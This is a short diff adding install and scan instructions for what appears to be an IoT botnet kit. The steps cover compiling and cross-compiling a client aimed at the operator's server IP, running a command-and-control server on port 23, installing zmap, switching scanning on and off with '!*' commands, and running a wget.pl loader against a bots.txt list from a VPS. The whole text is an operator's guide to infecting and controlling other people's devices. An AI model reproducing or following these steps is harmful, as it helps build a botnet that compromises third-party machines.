@@ -1,0 +1,18 @@
+Install:
+
+chmod +X wgetdependencys.sh
+chmod 777 wgetdependencys.sh
+./wgetdependencys.sh
+edit the client.c to your servers ip
+/crosscompiler.sh client.c
+gcc server.c -o server -pthread
+screen ./server 23 1 (connection port)
+
+Scan:
+
+sh zmap-install.sh
+!* SCANNER ON
+In screen -r
+!* SCANNER OFF
+!* WGET
+wget.pl bots.txt On VPS
